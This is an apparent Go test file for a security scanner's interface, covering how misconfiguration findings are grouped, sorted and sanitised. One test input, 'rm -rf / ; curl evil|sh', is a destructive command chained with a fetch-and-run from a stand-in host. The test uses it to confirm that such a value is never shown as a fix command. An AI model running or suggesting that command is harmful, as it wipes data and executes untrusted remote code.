package security

import (
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/charmbracelet/x/ansi"

	"github.com/anthnel/devdesk/internal/remediation"
	"github.com/anthnel/devdesk/internal/scan"
)

// DEVDESK-754 (SC2, steps 7 and 8, the pure half): the Misconfigurations tab's
// groups. One row per file and per fix: the key is the file, the rule
// (remediation.RuleKey, which folds Trivy's two spellings) and the state of the
// built-in fix. The count is a plain number of findings; nothing says "closed",
// because ctrl+o fixes one finding at a time.
//
// Hypotheses these tests freeze, for the coder to confirm or the user to overrule:
//   - fixGroup.Subject is the file as shown (shortPaths, inline text), fixGroup.Rule
//     the ID of the first member, fixGroup.Members the findings in scan order;
//   - a group's severity is the worst of its members';
//   - the key holds File, Rule and Fix apart (three fields, one comparable struct);
//   - a group's Command is set only when every member has the same plain command.

// ── Fixtures ─────────────────────────────────────────────────────────────────

const (
	mgCrit = scan.SeverityCritical
	mgHigh = scan.SeverityHigh
	mgMed  = scan.SeverityMedium
	mgLow  = scan.SeverityLow
)

// mgFinding is a Trivy misconfiguration the way a scan records it. The message
// tells two instances of one rule apart.
func mgFinding(id, file, message string, sev scan.SeverityLevel) scan.Finding {
	return scan.Finding{
		ID: id, Title: "Rule " + id, Message: message, Severity: sev,
		Source: scan.SourceTrivyMisconfig, File: file, Line: 1, EndLine: 3,
	}
}

// mgFindings are the findings of the Misconfigurations tests, interleaved on
// purpose so that no group is contiguous in the scan. Groups on disk, in the order
// the tab lists them (worst severity, most findings, file):
//
//	CRITICAL app.yaml        KSV-0003  1  No guidance available
//	HIGH     Dockerfile      DS002     3  Built-in fix available
//	HIGH     svc/Dockerfile  DS002     1  Built-in fix available
//	MEDIUM   deploy.yaml     KSV-0012  3  Manual (two MEDIUM, one LOW)
//	MEDIUM   pod.yaml        KSV-0104  1  Built-in fix unavailable: <reason>
//	LOW      pod.yaml        KSV-0104  1  Built-in fix available
func mgFindings() []scan.Finding {
	unconfined := mgFinding("KSV-0104", "pod.yaml", "Pod 'web' sets seccomp Unconfined", mgMed)
	unconfined.SeccompOrigin = "unconfined"
	absent := mgFinding("KSV-0104", "pod.yaml", "Pod 'job' sets no seccomp profile", mgLow)
	absent.SeccompOrigin = "absent"
	return []scan.Finding{
		mgFinding("KSV-0012", "deploy.yaml", "Container 'api' may run as root", mgMed),
		mgFinding("DS002", "Dockerfile", "stage build", mgHigh),
		mgFinding("DS002", "svc/Dockerfile", "svc stage", mgHigh),
		unconfined,
		mgFinding("DS002", "Dockerfile", "stage test", mgHigh),
		mgFinding("KSV-0003", "app.yaml", "Default capabilities not dropped", mgCrit),
		absent,
		mgFinding("KSV-0012", "deploy.yaml", "Container 'sidecar' may run as root", mgMed),
		mgFinding("DS002", "Dockerfile", "stage final", mgHigh),
		mgFinding("KSV-0012", "deploy.yaml", "Container 'init' may run as root", mgLow),
	}
}

// mgAllFindings is mgFindings with a CVE and a secret, which no group of the
// Misconfigurations tab may take.
func mgAllFindings() []scan.Finding {
	return append(mgFindings(),
		cve("CVE-1", "openssl", "alpine", "1.1.1k", "1.1.1w", mgHigh),
		scan.Finding{ID: "aws-access-token", Title: "AWS key committed", Severity: mgHigh, Source: scan.SourceGitleaks, File: "config/prod.env", Line: 12, Match: "AKIA..."},
	)
}

func messagesOf(fs []scan.Finding) []string {
	out := make([]string, 0, len(fs))
	for _, f := range fs {
		out = append(out, f.Message)
	}
	return out
}

// mgRow is what a test says about a group: file, rule, count, label of its Fix.
type mgRow struct {
	file, rule string
	count      int
	label      string
}

func rowsOf(groups []fixGroup) []mgRow {
	out := make([]mgRow, 0, len(groups))
	for _, g := range groups {
		out = append(out, mgRow{g.Subject, g.Rule, len(g.Members), g.Status.Label()})
	}
	return out
}

// groupAt is the group of file and rule whose Fix label is label.
func groupAt(t *testing.T, groups []fixGroup, file, rule, label string) fixGroup {
	t.Helper()
	for _, g := range groups {
		if g.Subject == file && g.Rule == rule && g.Status.Label() == label {
			return g
		}
	}
	t.Fatalf("no group %s %s %q in %v", file, rule, label, rowsOf(groups))
	return fixGroup{}
}

// ── What the fixtures assume of the catalog ──────────────────────────────────

// The expectations below read the catalog through fixStatusOf. If a rule moves
// in or out of it, this is the test that says so, not twenty others.
func TestMisconfigFixturesHaveTheStatusesTheTestsAssume(t *testing.T) {
	want := map[string]fixState{
		"DS002|":     fixBuiltIn,
		"KSV-0012|":  fixManual,
		"KSV-0003|":  fixNoGuidance,
		"KSV-0104|u": fixBuiltInDeclined,
		"KSV-0104|a": fixBuiltIn,
	}
	for _, f := range mgFindings() {
		origin := ""
		if f.SeccompOrigin != "" {
			origin = f.SeccompOrigin[:1]
		}
		key := f.ID + "|" + origin
		if got := fixStatusOf(f, true).State; got != want[key] {
			t.Errorf("%s (%s): state %v, want %v: the catalog changed under the fixtures", f.ID, f.SeccompOrigin, got, want[key])
		}
	}
	if fixStatusOf(unconfinedFinding(), true).Reason == "" {
		t.Error("a declined fix has no reason to show")
	}
}

func unconfinedFinding() scan.Finding {
	for _, f := range mgFindings() {
		if f.SeccompOrigin == "unconfined" {
			return f
		}
	}
	panic("no unconfined finding in the fixtures")
}

// ── The groups ───────────────────────────────────────────────────────────────

func TestMisconfigGroups(t *testing.T) {
	declined := fixStatusOf(unconfinedFinding(), true).Label()
	if !strings.HasPrefix(declined, "Built-in fix unavailable: ") {
		t.Fatalf("the declined label is %q", declined)
	}
	tests := []struct {
		name     string
		findings []scan.Finding
		onDisk   bool
		want     []mgRow
	}{
		{
			"one row per file and per fix, worst first, then the most findings, then the file",
			mgFindings(), true,
			[]mgRow{
				{"app.yaml", "KSV-0003", 1, "No guidance available"},
				{"Dockerfile", "DS002", 3, "Built-in fix available"},
				{"svc/Dockerfile", "DS002", 1, "Built-in fix available"},
				{"deploy.yaml", "KSV-0012", 3, "Manual"},
				{"pod.yaml", "KSV-0104", 1, declined},
				{"pod.yaml", "KSV-0104", 1, "Built-in fix available"},
			},
		},
		{
			"on an image nothing can be written: one row per rule and file, whatever the rule says",
			mgFindings(), false,
			[]mgRow{
				{"app.yaml", "KSV-0003", 1, "Cannot fix here"},
				{"Dockerfile", "DS002", 3, "Cannot fix here"},
				{"svc/Dockerfile", "DS002", 1, "Cannot fix here"},
				{"deploy.yaml", "KSV-0012", 3, "Cannot fix here"},
				{"pod.yaml", "KSV-0104", 2, "Cannot fix here"},
			},
		},
		{
			"one rule in one file is one row, however many instances",
			[]scan.Finding{
				mgFinding("DS002", "Dockerfile", "a", mgHigh), mgFinding("DS002", "Dockerfile", "b", mgHigh), mgFinding("DS002", "Dockerfile", "c", mgHigh),
			}, true,
			[]mgRow{{"Dockerfile", "DS002", 3, "Built-in fix available"}},
		},
		{
			"one rule in two files is two rows",
			[]scan.Finding{
				mgFinding("DS002", "a/Dockerfile", "x", mgHigh), mgFinding("DS002", "b/Dockerfile", "x", mgHigh),
			}, true,
			[]mgRow{{"a/Dockerfile", "DS002", 1, "Built-in fix available"}, {"b/Dockerfile", "DS002", 1, "Built-in fix available"}},
		},
		{
			"two rules in one file are two rows",
			[]scan.Finding{
				mgFinding("DS002", "Dockerfile", "x", mgHigh), mgFinding("KSV-0012", "Dockerfile", "y", mgHigh),
			}, true,
			[]mgRow{{"Dockerfile", "DS002", 1, "Built-in fix available"}, {"Dockerfile", "KSV-0012", 1, "Manual"}},
		},
		{
			"trivy's two spellings of a rule are one rule",
			[]scan.Finding{
				mgFinding("AVD-DS-0002", "Dockerfile", "x", mgHigh), mgFinding("DS002", "Dockerfile", "y", mgHigh),
			}, true,
			[]mgRow{{"Dockerfile", "AVD-DS-0002", 2, "Built-in fix available"}},
		},
		{
			"a rule the catalog does not know but whose finding carries guidance is Manual",
			[]scan.Finding{withResolution(mgFinding("KSV-0003", "app.yaml", "x", mgHigh))}, true,
			[]mgRow{{"app.yaml", "KSV-0003", 1, "Manual"}},
		},
		{
			"a rule with neither a fix nor guidance says so in words",
			[]scan.Finding{mgFinding("KSV-0003", "app.yaml", "x", mgHigh)}, true,
			[]mgRow{{"app.yaml", "KSV-0003", 1, "No guidance available"}},
		},
		{
			"the vulnerabilities, secrets and licences of a result are not groups of this tab",
			mgAllFindings()[len(mgFindings()):], true,
			[]mgRow{},
		},
		{"nothing at all", nil, true, []mgRow{}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := rowsOf(misconfigGroups(tc.findings, tc.onDisk))
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("groups =\n%v\nwant\n%v", got, tc.want)
			}
		})
	}
}

func TestMisconfigGroupsKeepTheirMembersInScanOrder(t *testing.T) {
	groups := misconfigGroups(mgFindings(), true)
	got := messagesOf(groupAt(t, groups, "Dockerfile", "DS002", "Built-in fix available").Members)
	if want := []string{"stage build", "stage test", "stage final"}; !reflect.DeepEqual(got, want) {
		t.Errorf("members = %v, want %v", got, want)
	}
	total := 0
	for _, g := range groups {
		total += len(g.Members)
	}
	if total != len(mgFindings()) {
		t.Errorf("the groups hold %d findings, the scan has %d: a finding is in no group or in two", total, len(mgFindings()))
	}
}

// The group is as bad as its worst finding, so a LOW instance does not hide a
// HIGH one behind it.
func TestAMisconfigGroupHasTheSeverityOfItsWorstMember(t *testing.T) {
	groups := misconfigGroups(mgFindings(), true)
	if got := groupAt(t, groups, "deploy.yaml", "KSV-0012", "Manual").Severity; got != mgMed {
		t.Errorf("deploy.yaml: severity %v, want MEDIUM (two MEDIUM and one LOW)", got)
	}
	low := []scan.Finding{
		mgFinding("KSV-0012", "a.yaml", "x", mgLow), mgFinding("KSV-0012", "a.yaml", "y", mgCrit), mgFinding("KSV-0012", "b.yaml", "z", mgHigh),
	}
	got := misconfigGroups(low, true)
	if len(got) != 2 || got[0].Subject != "a.yaml" || got[0].Severity != mgCrit {
		t.Errorf("groups = %v: a.yaml holds a CRITICAL finding and goes first", rowsOf(got))
	}
}

// Two rows that read the same cost the user a doubt: the state of the fix is in the
// key, so a rule declined for one instance and available for another is two rows.
func TestAMisconfigRuleDeclinedForOneInstanceAndAvailableForAnotherIsTwoRows(t *testing.T) {
	groups := misconfigGroups(mgFindings(), true)
	declined := groupAt(t, groups, "pod.yaml", "KSV-0104", fixStatusOf(unconfinedFinding(), true).Label())
	available := groupAt(t, groups, "pod.yaml", "KSV-0104", "Built-in fix available")
	if declined.Key == available.Key {
		t.Error("the two states of KSV-0104 in pod.yaml share a key")
	}
	if declined.Status.State != fixBuiltInDeclined || declined.Status.Reason == "" {
		t.Errorf("declined status = %+v, want the state and its reason", declined.Status)
	}
	if available.Status.State != fixBuiltIn {
		t.Errorf("available status = %+v", available.Status)
	}
}

// ── The key ──────────────────────────────────────────────────────────────────

func TestMisconfigGroupKeysAreDistinctAndFindTheirGroup(t *testing.T) {
	for _, onDisk := range []bool{true, false} {
		groups := misconfigGroups(mgFindings(), onDisk)
		if len(groups) == 0 {
			t.Fatalf("onDisk=%v: no groups", onDisk)
		}
		seen := map[groupKey]bool{}
		for _, g := range groups {
			if seen[g.Key] {
				t.Errorf("onDisk=%v: key %+v is shared by two groups", onDisk, g.Key)
			}
			seen[g.Key] = true
			found, ok := groupByKey(groups, g.Key)
			if !ok || !reflect.DeepEqual(messagesOf(found.Members), messagesOf(g.Members)) || found.Subject != g.Subject {
				t.Errorf("onDisk=%v: key %+v finds %v, want the group it came from", onDisk, g.Key, rowsOf([]fixGroup{found}))
			}
		}
	}
}

// A key made by joining the file and the rule with a separator merges the pairs
// below. Each pair is two groups here.
func TestMisconfigGroupKeysCannotBeAmbiguous(t *testing.T) {
	pairs := [][2]scan.Finding{
		// Both rules are outside the catalog, so the state of the fix cannot be what
		// tells the two apart.
		{mgFinding("KSV-0003", "x:Y", "m", mgHigh), mgFinding("Y:KSV-0003", "x", "m", mgHigh)},
		{mgFinding("KSV-0003", "x|Y", "m", mgHigh), mgFinding("Y|KSV-0003", "x", "m", mgHigh)},
		{mgFinding("KSV-0003", "x\x00Y", "m", mgHigh), mgFinding("Y\x00KSV-0003", "x", "m", mgHigh)},
		{mgFinding("KSV-0003", "x/y/", "m", mgHigh), mgFinding("KSV-0003", "x/y", "m", mgHigh)},
	}
	for i, pair := range pairs {
		groups := misconfigGroups([]scan.Finding{pair[0], pair[1]}, true)
		if len(groups) != 2 {
			t.Errorf("pair %d: %d groups, want 2: %v", i, len(groups), rowsOf(groups))
			continue
		}
		if groups[0].Key == groups[1].Key {
			t.Errorf("pair %d: both groups have the key %+v", i, groups[0].Key)
		}
	}
	// The same rule and file in another spelling is the same key.
	same := misconfigGroups([]scan.Finding{mgFinding("AVD-DS-0002", "Dockerfile", "a", mgHigh), mgFinding("ds002", "Dockerfile", "b", mgHigh)}, true)
	if len(same) != 1 {
		t.Errorf("%d groups for one rule spelled two ways, want 1", len(same))
	}
}

// ── Purity ───────────────────────────────────────────────────────────────────

func TestMisconfigGroupsAreAPureFunctionOfTheirInput(t *testing.T) {
	in := mgAllFindings()
	frozen := slices.Clone(in)
	first := misconfigGroups(in, true)
	second := misconfigGroups(in, true)
	if len(first) == 0 {
		t.Fatal("no groups: the test would compare nothing")
	}
	if !reflect.DeepEqual(first, second) {
		t.Error("two calls on the same input differ")
	}
	if !reflect.DeepEqual(in, frozen) {
		t.Error("misconfigGroups modified its input")
	}
	// The scan order does not decide the rows: the order is a function of the groups.
	reversed := slices.Clone(in)
	slices.Reverse(reversed)
	if got, want := rowsOf(misconfigGroups(reversed, true)), rowsOf(first); !reflect.DeepEqual(got, want) {
		t.Errorf("a reversed scan gives\n%v\nwant\n%v", got, want)
	}
}

// ── Findings with no file (an image) ─────────────────────────────────────────

// An image's misconfigurations name no file. They form a group per rule, in no
// way an error, whether or not the fix could run.
func TestMisconfigFindingsWithNoFileFormOneGroupPerRule(t *testing.T) {
	findings := []scan.Finding{
		mgFinding("DS002", "", "stage build", mgHigh),
		mgFinding("DS026", "", "no healthcheck", mgLow),
		mgFinding("DS002", "", "stage final", mgHigh),
	}
	for _, onDisk := range []bool{false, true} {
		groups := misconfigGroups(findings, onDisk)
		if len(groups) != 2 {
			t.Fatalf("onDisk=%v: %d groups, want 2: %v", onDisk, len(groups), rowsOf(groups))
		}
		if groups[0].Rule != "DS002" || len(groups[0].Members) != 2 || groups[1].Rule != "DS026" || len(groups[1].Members) != 1 {
			t.Errorf("onDisk=%v: groups = %v", onDisk, rowsOf(groups))
		}
		for _, g := range groups {
			requireTerminalSafe(t, "Subject", g.Subject)
			if strings.Contains(g.Subject, "\n") {
				t.Errorf("Subject %q holds a line break", g.Subject)
			}
		}
	}
}

// ── What the row says about the file ─────────────────────────────────────────

// The file is shown relative: the scanner container's mount is not part of the
// path the user knows.
func TestMisconfigGroupShowsARelativePath(t *testing.T) {
	groups := misconfigGroups([]scan.Finding{mgFinding("DS002", "/scan/svc/Dockerfile", "x", mgHigh)}, true)
	if len(groups) != 1 || groups[0].Subject != "svc/Dockerfile" {
		t.Errorf("groups = %v, want the file as svc/Dockerfile", rowsOf(groups))
	}
	// The key keeps what the scan said, the way sameFinding compares it.
	if len(groups) == 1 && groups[0].Key.File != "/scan/svc/Dockerfile" {
		t.Errorf("key file = %q: the key is the file as the finding names it", groups[0].Key.File)
	}
}

// ── The command ──────────────────────────────────────────────────────────────

func withCommand(f scan.Finding, command string) scan.Finding {
	f.FixCommand = command
	return f
}

func TestMisconfigGroupCommand(t *testing.T) {
	const cmd = "chmod 600 app.conf"
	tests := []struct {
		name     string
		findings []scan.Finding
		want     string
	}{
		{"every member has the same plain command", []scan.Finding{
			withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withCommand(mgFinding("KSV-0003", "a.yaml", "y", mgHigh), cmd),
		}, cmd},
		{"one finding", []scan.Finding{withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "  "+cmd+" \n")}, cmd},
		{"members that disagree", []scan.Finding{
			withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withCommand(mgFinding("KSV-0003", "a.yaml", "y", mgHigh), "chmod 644 app.conf"),
		}, ""},
		// Both are Manual (a command is guidance, a Resolution is guidance), so they
		// share a row, and a command that does not cover them all is not offered.
		{"a member with no command", []scan.Finding{
			withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withResolution(mgFinding("KSV-0003", "a.yaml", "y", mgHigh)),
		}, ""},
		{"no command at all", []scan.Finding{mgFinding("KSV-0003", "a.yaml", "x", mgHigh)}, ""},
		{"a command that is not plain words", []scan.Finding{
			withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "rm -rf / ; curl evil|sh"),
		}, ""},
		{"a command with a control character", []scan.Finding{
			withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "chmod 600 a\x1b[31m"),
		}, ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			groups := misconfigGroups(tc.findings, true)
			if len(groups) != 1 {
				t.Fatalf("%d groups, want 1", len(groups))
			}
			want := tc.want
			// runCommand decides what is a command and what is plain words.
			if cmd, ok := runCommand(tc.findings[0]); want != "" && (!ok || cmd != want) {
				t.Fatalf("setup: runCommand = %q, %v", cmd, ok)
			}
			if got := groups[0].Command; got != want {
				t.Errorf("Command = %q, want %q", got, want)
			}
		})
	}
}

// ── Text from the scan ───────────────────────────────────────────────────────

// The file and the rule are shown in the title, the footer and the cells: none may
// carry an escape sequence, a control character or a bidi mark.
func TestMisconfigGroupsShowNoControlOrBidiTextFromTheScan(t *testing.T) {
	tests := []struct {
		name string
		f    scan.Finding
	}{
		{"file", mgFinding("DS002", "svc/"+hostileText+"Dockerfile", "m", mgHigh)},
		{"rule", mgFinding("DS"+hostileText+"002", "Dockerfile", "m", mgHigh)},
		{"both", mgFinding("KSV"+hostileText+"-0003", "a"+hostileText+"/b.yaml", "m", mgHigh)},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			groups := misconfigGroups([]scan.Finding{tc.f}, true)
			if len(groups) != 1 {
				t.Fatalf("%d groups, want 1", len(groups))
			}
			g := groups[0]
			requireTerminalSafe(t, "Subject", g.Subject)
			requireTerminalSafe(t, "Rule", g.Rule)
			requireTerminalSafe(t, "title", groupTitle(g))
			if strings.Contains(g.Subject+g.Rule, "\n") {
				t.Errorf("a line feed survives in %q / %q", g.Subject, g.Rule)
			}
			cols := misconfigGroupColumns()
			if len(cols) == 0 {
				t.Fatal("no columns")
			}
			for _, c := range cols {
				cell := c.Cell(g)
				requireTerminalSafe(t, "cell "+c.Title, cell)
				if ansi.Strip(cell) != cell {
					t.Errorf("cell %s = %q holds an escape sequence (Rule 122)", c.Title, cell)
				}
			}
		})
	}
}

// ── The columns ──────────────────────────────────────────────────────────────

func TestMisconfigGroupColumns(t *testing.T) {
	cols := misconfigGroupColumns()
	var titles []string
	for _, c := range cols {
		titles = append(titles, c.Title)
	}
	if want := []string{"Severity", "File", "Rule", "Findings", "Fix"}; !reflect.DeepEqual(titles, want) {
		t.Fatalf("columns = %v, want %v", titles, want)
	}
	groups := misconfigGroups(mgFindings(), true)
	g := groupAt(t, groups, "Dockerfile", "DS002", "Built-in fix available")
	want := []string{"HIGH", "Dockerfile", "DS002", "3", "Built-in fix available"}
	for i, c := range cols {
		if got := c.Cell(g); got != want[i] {
			t.Errorf("%s cell = %q, want %q: the count is a plain number, the Fix is the closed vocabulary", c.Title, got, want[i])
		}
	}
	// Only the severity carries a colour (Rule 122); every column sorts, so that
	// `.` has something to cycle through.
	for _, c := range cols {
		if c.Less == nil {
			t.Errorf("column %s has no Less: `.` would skip it", c.Title)
		}
	}
	declined := groupAt(t, groups, "pod.yaml", "KSV-0104", fixStatusOf(unconfinedFinding(), true).Label())
	if got := cols[4].Cell(declined); got != declined.Status.Label() || !strings.HasPrefix(got, "Built-in fix unavailable: ") {
		t.Errorf("Fix cell of a declined group = %q, want the label with its reason", got)
	}
}

// Nothing in a group says it is closed, fixed or done: a group is read again from
// the last scan, and one ctrl+o fixes one finding.
func TestNoMisconfigColumnPromisesToCloseAnything(t *testing.T) {
	if len(misconfigGroupColumns()) != 5 {
		t.Fatalf("%d columns, want 5", len(misconfigGroupColumns()))
	}
	for _, c := range misconfigGroupColumns() {
		for _, word := range []string{"clos", "done", "fixed", "cleared", "resolved"} {
			if strings.Contains(strings.ToLower(c.Title), word) {
				t.Errorf("column %q promises an outcome", c.Title)
			}
		}
	}
}

// What a group can say about Fixable: nothing. It is the vulnerabilities' figure.
func TestMisconfigGroupsAreNotCountedInFixable(t *testing.T) {
	findings := mgFindings()
	if got := remediation.Summarize(findings).Fixable(); got != 0 {
		t.Fatalf("Fixable of the misconfigurations alone = %d, want 0", got)
	}
	groups := misconfigGroups(findings, true)
	if len(groups) == 0 {
		t.Fatal("no groups")
	}
	for _, g := range groups {
		if g.Key.Unfixed {
			t.Errorf("group %s %s is marked Unfixed: that is the vulnerabilities' word", g.Subject, g.Rule)
		}
	}
}
